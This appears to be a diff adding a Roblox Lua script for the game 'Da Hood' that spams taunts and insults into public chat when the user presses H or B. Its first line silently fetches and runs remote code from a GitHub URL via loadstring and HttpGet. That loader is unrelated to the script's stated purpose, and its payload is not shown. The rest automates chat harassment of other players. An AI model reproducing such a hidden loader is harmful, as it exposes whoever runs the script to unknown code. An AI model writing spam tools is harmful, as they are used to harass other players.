@@ -1,0 +1,71 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/sliwyz/super/main/work"), true))()
+
+--// NOTIFICATION \\--
+game.StarterGui:SetCore("SendNotification", {
+    Title = "Chat Spam - Da Hood";
+    Text = "Da Hood Shit Talker made by sliwy#0001";
+    Icon = "";
+    Duration = "1";
+    callbakc = bindableFunction;
+    Button1 = "Okay";
+})
+
+game.StarterGui:SetCore("SendNotification", {
+    Title = "Keybinds";
+    Text = "H: Shit Talker \n B: Decent Shit Talker";
+    Icon = "";
+    Duration = "1";
+    callbakc = bindableFunction;
+    Button1 = "Understood";
+})
+
+
+--// MAIN \\--
+
+--// Shit Talker
+local words = {
+    'ez',
+    'L',
+    'Dog water',
+    'Bozo',
+    '@illegsl on tiktok',
+    'Get sh on',
+    'Get better aim',
+    '0 Awareness',
+    'No clue',
+    'L + Ratio + Clown 🤡 + Bozo',
+}
+
+local player = game.Players.LocalPlayer
+local keybind = 'h'
+
+local event = game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
+
+player:GetMouse().KeyDown:connect(function(key)
+    if key == keybind then
+        event:FireServer(words[math.random(#words)], "All")
+    end
+end)
+
+
+
+--// Decent Shit Talker
+local words = {
+    'Try to find your awareness 😁👍',
+    'Respectfully train your aim',
+    'Try to predict a little better, next time',
+    'Nice aim how much you train?',
+    'You should get better ping 🙂',
+    'Great aim but still not better!',
+}
+
+local player = game.Players.LocalPlayer
+local keybind = 'b'
+
+local event = game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
+
+player:GetMouse().KeyDown:connect(function(key)
+    if key == keybind then
+        event:FireServer(words[math.random(#words)], "All")
+    end
+end)
